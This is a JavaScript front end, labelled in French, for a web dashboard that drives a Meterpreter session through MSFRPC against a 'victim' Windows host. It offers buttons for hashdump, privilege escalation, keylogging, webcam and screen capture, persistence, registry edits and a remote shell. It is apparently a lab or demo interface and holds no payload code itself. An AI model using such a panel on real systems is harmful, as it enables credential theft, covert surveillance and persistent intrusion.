const controlSpec = [
  {
    title: '📁 Système',
    actions: [
      ['Sysinfo', 'sysinfo'],
      ['Getuid', 'getuid'],
      ['Getpid', 'getpid'],
      ['PS', 'ps'],
    ],
  },
  {
    title: '🔐 Privilèges',
    actions: [
      ['Getsystem', 'getsystem'],
      ['Hashdump', 'hashdump'],
      ['Verify UID', 'verify_uid'],
    ],
  },
  {
    title: '🗂️ Fichiers',
    actions: [
      ['PWD', 'pwd'],
      ['LS', 'ls'],
      ['Upload', 'upload'],
      ['Download', 'download'],
    ],
  },
  {
    title: '📸 Capture',
    actions: [
      ['Screenshot', 'screenshot'],
      ['Webcam snap', 'webcam_snap'],
    ],
  },
  {
    title: '🌐 Réseau',
    actions: [
      ['Ipconfig', 'ipconfig'],
      ['ARP', 'arp'],
      ['Portfwd', 'portfwd'],
    ],
  },
  {
    title: '🔑 Persistance',
    actions: [
      ['Run persistence', 'persistence'],
      ['Reg add', 'reg_add'],
    ],
  },
  {
    title: '💀 Post-exploitation',
    actions: [
      ['Keyscan start', 'keyscan_start'],
      ['Keyscan stop', 'keyscan_stop'],
      ['Keyscan dump', 'keyscan_dump'],
      ['Shell', 'shell'],
    ],
  },
];

const resultPanel = document.getElementById('result-panel');
const screenshotPreview = document.getElementById('screenshot-preview');
const activityLog = document.getElementById('activity-log');

function now() {
  return new Date().toLocaleTimeString('fr-FR', { hour12: false });
}

function addLog(command, output, status = 'success') {
  const color = status === 'error' ? 'text-red-400' : status === 'info' ? 'text-orange-400' : 'text-emerald-400';
  const item = document.createElement('div');
  const shortResult = typeof output === 'string' ? output.slice(0, 70) : JSON.stringify(output).slice(0, 70);
  item.className = color;
  item.textContent = `[${now()}] ► ${command} → ${shortResult}`;
  activityLog.appendChild(item);
  activityLog.scrollTop = activityLog.scrollHeight;
}

function setResult(data) {
  if (typeof data === 'string') {
    resultPanel.textContent = data;
  } else {
    resultPanel.textContent = JSON.stringify(data, null, 2);
  }
}

async function requestJSON(url, options = {}) {
  const response = await fetch(url, {
    headers: { 'Content-Type': 'application/json' },
    ...options,
  });
  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.result || 'Request failed');
  }
  return data;
}

async function runCommand(command) {
  try {
    if (command === 'screenshot') {
      const data = await requestJSON('/api/screenshot');
      if (data.image_base64) {
        screenshotPreview.src = `data:image/png;base64,${data.image_base64}`;
        screenshotPreview.classList.remove('hidden');
      }
      setResult(data);
      addLog(command, data.image_base64 ? 'Image reçue (base64)' : 'Aucune image', 'success');
      return;
    }

    if (command === 'ps') {
      const data = await requestJSON('/api/ps');
      setResult(data.processes);
      addLog(command, `${data.processes.length} processus`, 'success');
      return;
    }

    if (command === 'sysinfo') {
      const data = await requestJSON('/api/sysinfo');
      setResult(data.sysinfo_output);
      addLog(command, data.sysinfo_output, 'success');
      return;
    }

    if (command === 'upload') {
      const fileInput = document.getElementById('upload-file');
      const remotePath = document.getElementById('upload-remote').value;
      if (!fileInput.files.length || !remotePath) {
        throw new Error('Choisir un fichier et un chemin distant');
      }
      const formData = new FormData();
      formData.append('file', fileInput.files[0]);
      formData.append('remote_path', remotePath);
      const response = await fetch('/api/file/upload', { method: 'POST', body: formData });
      const data = await response.json();
      if (!response.ok) throw new Error(data.result || 'Upload failed');
      setResult(data);
      addLog(command, 'Upload OK', 'success');
      return;
    }

    if (command === 'download') {
      const remotePath = document.getElementById('download-remote').value;
      const data = await requestJSON('/api/file/download', {
        method: 'POST',
        body: JSON.stringify({ remote_path: remotePath }),
      });
      setResult(data);
      addLog(command, data.success ? 'Download OK' : 'Download KO', data.success ? 'success' : 'error');
      return;
    }

    let payload = {};
    if (command === 'ls') {
      payload.path = document.getElementById('ls-path').value || '.';
    }
    if (command === 'portfwd') {
      payload.local = document.getElementById('portfwd-local').value;
      payload.remote = document.getElementById('portfwd-remote').value;
    }
    if (command === 'persistence') {
      payload.interval = document.getElementById('persistence-interval').value;
      payload.port = document.getElementById('persistence-port').value;
    }
    if (command === 'reg_add') {
      payload.key = document.getElementById('reg-key').value;
      payload.value = document.getElementById('reg-value').value;
    }

    const data = await requestJSON(`/api/cmd/${command}`, {
      method: 'POST',
      body: JSON.stringify(payload),
    });
    setResult(data.result);
    addLog(command, data.result, data.status === 'error' ? 'error' : 'success');
  } catch (error) {
    setResult(error.message);
    addLog(command, error.message, 'error');
  }
}

function renderControls() {
  const panel = document.getElementById('control-panel');
  panel.innerHTML = '';
  controlSpec.forEach((group, idx) => {
    const wrapper = document.createElement('div');
    wrapper.className = 'mb-2 border border-slate-700 rounded';

    const header = document.createElement('button');
    header.className = 'w-full text-left px-3 py-2 bg-slate-800 hover:bg-slate-700';
    header.textContent = group.title;

    const content = document.createElement('div');
    content.className = `accordion-content p-3 ${idx === 0 ? 'open' : ''}`;

    group.actions.forEach(([label, command]) => {
      const btn = document.createElement('button');
      btn.className = 'block w-full text-left px-2 py-1 mb-1 rounded bg-slate-900 hover:bg-action hover:text-white';
      btn.textContent = label;
      btn.addEventListener('click', () => runCommand(command));
      content.appendChild(btn);
    });

    if (group.title.includes('Fichiers')) {
      content.insertAdjacentHTML(
        'beforeend',
        `
        <input id="ls-path" class="w-full mt-1 mb-1 bg-slate-800 p-1 rounded text-xs" placeholder="Path pour LS" value="." />
        <input id="upload-file" type="file" class="w-full text-xs mb-1" />
        <input id="upload-remote" class="w-full bg-slate-800 p-1 rounded text-xs mb-1" placeholder="Remote upload path" />
        <input id="download-remote" class="w-full bg-slate-800 p-1 rounded text-xs" placeholder="Remote download path" />
      `,
      );
    }

    if (group.title.includes('Réseau')) {
      content.insertAdjacentHTML(
        'beforeend',
        `
        <input id="portfwd-local" class="w-full mt-1 bg-slate-800 p-1 rounded text-xs mb-1" placeholder="Local port" />
        <input id="portfwd-remote" class="w-full bg-slate-800 p-1 rounded text-xs" placeholder="Remote host:port" />
      `,
      );
    }

    if (group.title.includes('Persistance')) {
      content.insertAdjacentHTML(
        'beforeend',
        `
        <input id="persistence-interval" class="w-full mt-1 bg-slate-800 p-1 rounded text-xs mb-1" placeholder="Intervalle" />
        <input id="persistence-port" class="w-full bg-slate-800 p-1 rounded text-xs mb-1" placeholder="Port" />
        <input id="reg-key" class="w-full bg-slate-800 p-1 rounded text-xs mb-1" placeholder="Reg key" />
        <input id="reg-value" class="w-full bg-slate-800 p-1 rounded text-xs" placeholder="Reg value" />
      `,
      );
    }

    header.addEventListener('click', () => {
      content.classList.toggle('open');
    });

    wrapper.appendChild(header);
    wrapper.appendChild(content);
    panel.appendChild(wrapper);
  });
}

async function updateStatus() {
  try {
    const data = await requestJSON('/api/status', { headers: {} });
    document.getElementById('victim-hostname').textContent = data.hostname || 'WINDOWS-TARGET';
    document.getElementById('victim-os').textContent = `OS: ${data.os || 'Unknown'}`;
    document.getElementById('victim-ip').textContent = `IP: ${data.ip || 'N/A'}`;

    const badge = document.getElementById('status-badge');
    const card = document.getElementById('victim-card');
    const arrow = document.getElementById('attack-arrow');

    if (data.compromised) {
      badge.textContent = 'COMPROMIS ☣️';
      badge.className = 'inline-flex mt-2 px-2 py-1 text-xs rounded border border-compromised text-compromised pulse-compromised';
      card.classList.add('border-compromised');
      card.classList.remove('border-healthy');
      if (data.arrow_active) arrow.classList.remove('hidden');
    } else {
      badge.textContent = 'SAIN';
      badge.className = 'inline-flex mt-2 px-2 py-1 text-xs rounded border border-healthy text-healthy';
      card.classList.remove('border-compromised');
      card.classList.add('border-healthy');
      arrow.classList.add('hidden');
    }
  } catch {
    addLog('status', 'MSFRPC indisponible', 'info');
  }
}

document.getElementById('clear-log').addEventListener('click', () => {
  activityLog.innerHTML = '';
});

renderControls();
updateStatus();
setInterval(updateStatus, 3000);
